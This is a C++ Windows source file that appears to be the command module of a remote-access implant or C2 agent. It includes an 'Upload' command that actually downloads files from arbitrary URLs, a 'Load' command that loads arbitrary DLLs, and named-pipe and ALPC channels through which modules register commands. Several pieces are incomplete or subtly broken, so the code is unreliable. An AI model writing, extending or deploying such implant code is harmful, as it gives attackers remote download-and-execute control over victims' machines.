#include "custom_command.hpp"
#include <fstream>
#include <windows.h>
#include <stdio.h>
#include <map>
#include <functional>
#include <iostream>
#include <string>
#include <sstream>
#include <vector>
#include <cstring>
#include <fstream>
#include <wininet.h>
#include "alpcapi.h"

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ntdll.lib")



BOOL CustomCommand(const char* command, std::string* output);
std::vector<std::string> SplitArgs(const std::string& input);
void Upload(const std::vector<std::string>& args);
void CustomSleepCmd(const std::vector<std::string>& args);

void dump_registers_funcs(const std::vector<std::string>& args);
BOOL SendCommandToClient_pipe(const char* proc_name, const std::vector<std::string>& args, DWORD64 CommandID);
void createPipe();
BOOL CreateAlpcPort(LPCWSTR PortName);
using CommandFunc = void(*)(const std::vector<std::string>&);
void setup_alpc(const std::vector<std::string>& args);
void exit_(const std::vector<std::string>& args);
void debug(const std::vector<std::string>& args);
void setup_pipe(const std::vector<std::string>& args);

void RegisterCommand(const std::string& name, CommandFunc func, USHORT clientID);

HANDLE hPipe = INVALID_HANDLE_VALUE;
bool pipeConnected = false;
CRITICAL_SECTION pipeCriticalSection;


typedef struct Data {
    USHORT currentClient = 0;


};
typedef struct Message {
    USHORT receiverID;
    USHORT messageType;
    // DWORD64 contentType;
    char commandName[0x10];
    DWORD64 commandAddr;  // Use as ID if remote process
    char messageContent[0x400];
} Message;

enum MessageType : USHORT {
    REGISTER,
    COMMAND,
    RESPONSE,
    HELLO,
    OUTPUT
};

std::vector<std::string> LoadedModules;





void exit_(const std::vector<std::string>& args) {
    printf("Exiting...\n");
    ExitProcess(0);
}

void debug(const std::vector<std::string>& args) {
    SendCommandToClient_pipe("HELLO", LoadedModules, 0);
}
void setup_pipe(const std::vector<std::string>& args) {
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)createPipe, NULL, 0, NULL);
}
void setup_alpc(const std::vector<std::string>& args) {
    auto port_name = args.empty() ? L"\\BaseNamedObjects\\MyAlpcPort" : std::wstring(args[0].begin(), args[0].end());
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CreateAlpcPort, (LPVOID)port_name.c_str(), 0, NULL);

}
BOOL switch_agent(const std::vector<std::string>& args) {
    if (args.empty()) {
        std::cout << "Missing argument for switch_agent\n";
        return FALSE;
    }
    std::string agent_name = args[0];





}


std::map<std::string, std::function<void(const std::vector<std::string>&)>> local_proc = {
    { "exit",exit_},
    { "q", exit_},
    { "a", debug},
    {"named_pipe", setup_pipe},
    {"alpc", setup_alpc},



    { "Sleep", CustomSleepCmd },
    { "Upload", Upload  },
    { "Dump", dump_registers_funcs  }

};


std::map<std::string, std::pair<USHORT, CommandFunc>> remote_proc = {};

Message serialize_message(const char* proc_name, const std::vector<std::string>& args, DWORD64 CommandID) {

    Message msg = { 0 };
    msg.messageType = COMMAND;
    msg.commandAddr = CommandID;
    strncpy_s(msg.commandName, proc_name, sizeof(msg.commandName) - 1);
    std::string args_concat;
    for (const auto& a : args) args_concat += a + " ";
    strncpy_s(msg.messageContent, args_concat.c_str(), sizeof(msg.messageContent) - 1);
    return msg;

}

void RegisterCommand(const std::string& name, CommandFunc func, USHORT clientID = 0) {
    printf("[+] Command %s registered at address %p\n", name.c_str(), func);

    if ((DWORD64)func < 0x10000) {
        remote_proc[name] = std::make_pair(clientID, func);
        return;

    }
    local_proc[name] = func;
    return;
}


std::vector<std::string> SplitArgs(const std::string& input) {
    std::stringstream ss(input);
    std::string arg;
    std::vector<std::string> args;
    while (ss >> arg) {
        args.push_back(arg);
    }
    return args;
}

void CustomSleepCmd(const std::vector<std::string>& args) {
    if (args.empty()) {
        std::cout << "Missing argument for Sleep\n";
        return;
    }
    unsigned int milliseconds = std::stoi(args[0]);
    if (milliseconds == 0) return;
    Sleep(milliseconds);
}

void Upload(const std::vector<std::string>& args) {
    //arg 0: URL qrg1: destination path 
    if (args.size() < 2) {
        std::cout << "Usage: Download <URL> <Destination Path>\n";
        return;
    }
    std::string url = args[0];
    std::string destPath = args[1];
    HINTERNET hInternet = InternetOpenA("Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        return;
    }

    HINTERNET hConnect = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return;
    }
    DWORD bytesRead;
    std::ofstream outFile(destPath, std::ios::binary);
    if (!outFile) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return;
    }
    char buffer[4096];
    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        outFile.write(buffer, bytesRead);
    }
    outFile.close();
    InternetCloseHandle(hConnect);
}


void Load(const std::vector<std::string>& args) {
    if (args.empty()) {
        std::cout << "Missing argument for Load\n";
        return;
    }
    std::string dllPath = args[0];
    HMODULE hModule = LoadLibraryA(dllPath.c_str());
    if (!hModule) {
        std::cout << "Failed to load DLL: " << dllPath << "\n";
        return;
    }
    std::cout << "DLL loaded successfully: " << dllPath << "\n";
}

BOOL CallRemProc(const char* proc_name, const std::vector<std::string>& args, DWORD64 CommandID) {
    return SendCommandToClient_pipe(proc_name, args, CommandID);
}

BOOL CustomCommand(const char* command, std::string* output) {
    if (command == nullptr || std::strlen(command) == 0) {
        return false;
    }
    std::string full_cmd(command);
    auto tokens = SplitArgs(full_cmd);

    if (tokens.empty()) return false;
    std::string cmd_name = tokens[0];
    tokens.erase(tokens.begin());

    auto it = local_proc.find(cmd_name);
    if (it != local_proc.end()) {
        it->second(tokens);
        return true;
    }
    auto jt = remote_proc.find(cmd_name);
    if (jt != remote_proc.end()) {
        auto func = jt->second.first;
        CallRemProc(cmd_name.c_str(), tokens, func);
        return true;
    }

    else {
        std::cout << "Unknown command: " << cmd_name << "\n";
        return false;
    }
}


void dump_registers_funcs(const std::vector<std::string>& args) {
    for (const auto& pair : local_proc) {
        printf("Command: %s, Address: %p\n", pair.first.c_str(), pair.second.target<CommandFunc>());
    }
}

void parsing(Message* Message) {


    switch (Message->messageType) {
    case REGISTER:
        RegisterCommand(Message->commandName, reinterpret_cast<CommandFunc>(Message->commandAddr));

        break;
    case HELLO:
        LoadedModules.push_back(std::string(Message->messageContent));
        printf("Module loaded :: %s\n", Message->messageContent);
        break;
    case OUTPUT:
        printf("Output from module :: %s\n", Message->messageContent);
        break;
    default:
        printf("Unknown message type: %d\n", Message->messageType);
        break;
    }



}
DWORD WINAPI PipeReadThread(LPVOID lpParam) {
    while (true) {
        EnterCriticalSection(&pipeCriticalSection);
        bool connected = pipeConnected;
        HANDLE currentPipe = hPipe;
        LeaveCriticalSection(&pipeCriticalSection);

        if (!connected || currentPipe == INVALID_HANDLE_VALUE) {
            break;
        }

        Message msg = { 0 };
        DWORD bytesRead = 0;

        BOOL success = ReadFile(currentPipe, &msg, sizeof(msg), &bytesRead, NULL);
        if (!success || bytesRead == 0) {
            DWORD err = GetLastError();
            if (err == ERROR_BROKEN_PIPE) {
                EnterCriticalSection(&pipeCriticalSection);
                pipeConnected = false;
                if (hPipe != INVALID_HANDLE_VALUE) {
                    CloseHandle(hPipe);
                    hPipe = INVALID_HANDLE_VALUE;
                }
                LeaveCriticalSection(&pipeCriticalSection);

                break;
            }
            Sleep(100);
            continue;
        }

        printf("[+] Message: Type=%d, Nom=%s\n", msg.messageType, msg.commandName);
        parsing(&msg);

    }

    return 0;
}

void createPipe() {
    while (true) {
        HANDLE newPipe = CreateNamedPipeA(
            "\\\\.\\pipe\\COMx",
            PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
            PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
            1,
            sizeof(Message),
            sizeof(Message),
            0,
            NULL
        );

        if (newPipe == INVALID_HANDLE_VALUE) {
            Sleep(5000);
            continue;
        }
        BOOL connected = ConnectNamedPipe(newPipe, NULL) ?
            TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);

        if (!connected) {
            CloseHandle(newPipe);
            Sleep(5000);
            continue;
        }
        EnterCriticalSection(&pipeCriticalSection);
        if (hPipe != INVALID_HANDLE_VALUE) {
            CloseHandle(hPipe);
        }
        hPipe = newPipe;
        pipeConnected = true;
        LeaveCriticalSection(&pipeCriticalSection);

        HANDLE hReadThread = CreateThread(NULL, 0, PipeReadThread, NULL, 0, NULL);

        WaitForSingleObject(hReadThread, INFINITE);
        CloseHandle(hReadThread);

        EnterCriticalSection(&pipeCriticalSection);
        if (hPipe != INVALID_HANDLE_VALUE) {
            FlushFileBuffers(hPipe);
            DisconnectNamedPipe(hPipe);
            CloseHandle(hPipe);
            hPipe = INVALID_HANDLE_VALUE;
        }
        pipeConnected = false;
        LeaveCriticalSection(&pipeCriticalSection);

    }
}
BOOL SendCommandToClient_pipe(const char* proc_name, const std::vector<std::string>& args, DWORD64 CommandID) {
    EnterCriticalSection(&pipeCriticalSection);
    HANDLE currentPipe = hPipe;
    bool connected = pipeConnected;
    LeaveCriticalSection(&pipeCriticalSection);

    if (!connected || currentPipe == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    //Message msg = { 0 };
    //msg.messageType = COMMAND;
    //msg.commandAddr = CommandID;
    //std::strncpy(msg.commandName, proc_name, sizeof(msg.commandName) - 1);
    //std::string args_concat;
    //for (const auto& a : args) args_concat += a + " ";
    //std::strncpy(msg.messageContent, args_concat.c_str(), sizeof(msg.messageContent) - 1);
    Message msg = serialize_message(proc_name, args, CommandID);

    OVERLAPPED ol = { 0 };
    ol.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (!ol.hEvent) {
        return FALSE;
    }

    DWORD bytesWritten = 0;
    BOOL ok = WriteFile(currentPipe, &msg, sizeof(msg), &bytesWritten, &ol);
    if (!ok) {
        DWORD err = GetLastError();
        if (err == ERROR_IO_PENDING) {
            DWORD wait = WaitForSingleObject(ol.hEvent, 3000);
            if (wait == WAIT_OBJECT_0) {
                if (!GetOverlappedResult(currentPipe, &ol, &bytesWritten, FALSE)) {
                    CloseHandle(ol.hEvent);
                    return FALSE;
                }
            }
            else {
                CancelIoEx(currentPipe, &ol);
                CloseHandle(ol.hEvent);
                return FALSE;
            }
        }
        else {
            CloseHandle(ol.hEvent);
            return FALSE;
        }
    }
    CloseHandle(ol.hEvent);
    return TRUE;
}
#define MAX_MSG_LEN sizeof(PORT_MESSAGE)

LPVOID AllocMsgMem(SIZE_T Size)
{
    /*
        It's important to understand that after the PORT_MESSAGE struct is the message data
    */
    return(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, Size + sizeof(PORT_MESSAGE)));
}
BOOL CreateAlpcPort(LPCWSTR PortName) {

    ALPC_PORT_ATTRIBUTES    serverPortAttr;
    OBJECT_ATTRIBUTES       objPort;
    UNICODE_STRING          usPortName;
    PORT_MESSAGE            pmRequest;
    PORT_MESSAGE            pmReceive;
    NTSTATUS                ntRet;
    BOOLEAN                 bBreak;
    HANDLE                  hConnectedPort;
    HANDLE                  hPort;
    SIZE_T                  nLen;
    LPVOID                  lpMem;
    BYTE                    bTemp;

    RtlInitUnicodeString(&usPortName, PortName);
    InitializeObjectAttributes(&objPort, &usPortName, 0, 0, 0);
    RtlSecureZeroMemory(&serverPortAttr, sizeof(serverPortAttr));
    serverPortAttr.MaxMessageLength = MAX_MSG_LEN; // For ALPC this can be max of 64KB


    using NtAlpcCreatePort_t = NTSTATUS(NTAPI*)(PHANDLE, POBJECT_ATTRIBUTES, PALPC_PORT_ATTRIBUTES);
    NtAlpcCreatePort_t NtAlpcCreatePort = (NtAlpcCreatePort_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAlpcCreatePort");


    ntRet = NtAlpcCreatePort(&hPort, &objPort, &serverPortAttr);
    printf("[i] NtAlpcCreatePort: 0x%X\n", ntRet);
    if (!ntRet)
    {
        nLen = sizeof(pmReceive);
        using NtAlpcSendWaitReceivePort_t = NTSTATUS(NTAPI*)(HANDLE, ULONG, PPORT_MESSAGE, PALPC_MESSAGE_ATTRIBUTES, PPORT_MESSAGE, PSIZE_T, PALPC_MESSAGE_ATTRIBUTES, PLARGE_INTEGER);
        NtAlpcSendWaitReceivePort_t NtAlpcSendWaitReceivePort = (NtAlpcSendWaitReceivePort_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAlpcSendWaitReceivePort");

        ntRet = NtAlpcSendWaitReceivePort(hPort, 0, NULL, NULL, &pmReceive, &nLen, NULL, NULL);
        if (!ntRet)
        {
            RtlSecureZeroMemory(&pmRequest, sizeof(pmRequest));
            pmRequest.MessageId = pmReceive.MessageId;
            pmRequest.u1.s1.DataLength = 0x0;
            pmRequest.u1.s1.TotalLength = pmRequest.u1.s1.DataLength + sizeof(PORT_MESSAGE);
            using NtAlpcAcceptConnectPort_t = NTSTATUS(NTAPI*)(PHANDLE, HANDLE, ULONG, POBJECT_ATTRIBUTES, PALPC_PORT_ATTRIBUTES, PVOID, PPORT_MESSAGE, PALPC_MESSAGE_ATTRIBUTES, BOOLEAN);
            NtAlpcAcceptConnectPort_t NtAlpcAcceptConnectPort = (NtAlpcAcceptConnectPort_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAlpcAcceptConnectPort");

            ntRet = NtAlpcAcceptConnectPort(&hConnectedPort, hPort, 0, NULL, NULL, NULL, &pmRequest, NULL, TRUE); // 0
            printf("[i] NtAlpcAcceptConnectPort: 0x%X\n", ntRet);
            if (!ntRet)
            {
                bBreak = TRUE;
                while (bBreak)
                {
                    nLen = MAX_MSG_LEN;
                    lpMem = AllocMsgMem(nLen);
                    NtAlpcSendWaitReceivePort(hPort, 0, NULL, NULL, (PPORT_MESSAGE)lpMem, &nLen, NULL, NULL);
                    pmReceive = *(PORT_MESSAGE*)lpMem;
                    if (!strcmp((char*)lpMem + sizeof(PORT_MESSAGE), "exit\n"))
                    {
                        printf("[i] Received 'exit' command\n");
                        HeapFree(GetProcessHeap(), 0, lpMem);
                        using NtAlpcDisconnectPort_t = NTSTATUS(NTAPI*)(HANDLE, ULONG);
                        NtAlpcDisconnectPort_t NtAlpcDisconnectPort = (NtAlpcDisconnectPort_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAlpcDisconnectPort");

                        ntRet = (NTSTATUS)NtAlpcDisconnectPort(hPort, 0);
                        printf("[i] NtAlpcDisconnectPort: %X\n", ntRet);
                        CloseHandle(hConnectedPort);
                        CloseHandle(hPort);
                        ExitThread(0);
                    }
                    else
                    {
                        printf("[i] Received Data: ");
                        for (int i = 0; i <= pmReceive.u1.s1.DataLength; i++)
                        {
                            bTemp = *(BYTE*)((BYTE*)lpMem + i + sizeof(PORT_MESSAGE));
                            printf("0x%X ", bTemp);
                        }
                        printf("\n");
                        HeapFree(GetProcessHeap(), 0, lpMem);
                    }
                }
            }
        }
    }
    ExitThread(0);


    return TRUE;
}


int init_() {

    HANDLE hPipeThread = NULL;
    bool connected;


    InitializeCriticalSection(&pipeCriticalSection);
    RegisterCommand("Load", Load);



    

    EnterCriticalSection(&pipeCriticalSection);
    connected = pipeConnected;
    LeaveCriticalSection(&pipeCriticalSection);

    
    EnterCriticalSection(&pipeCriticalSection);
    pipeConnected = false;
    if (hPipe != INVALID_HANDLE_VALUE) {
        CloseHandle(hPipe);
        hPipe = INVALID_HANDLE_VALUE;
    }
    LeaveCriticalSection(&pipeCriticalSection);

    if (hPipeThread) {
        WaitForSingleObject(hPipeThread, 5000);
        CloseHandle(hPipeThread);
    }

    DeleteCriticalSection(&pipeCriticalSection);

    return 0;
}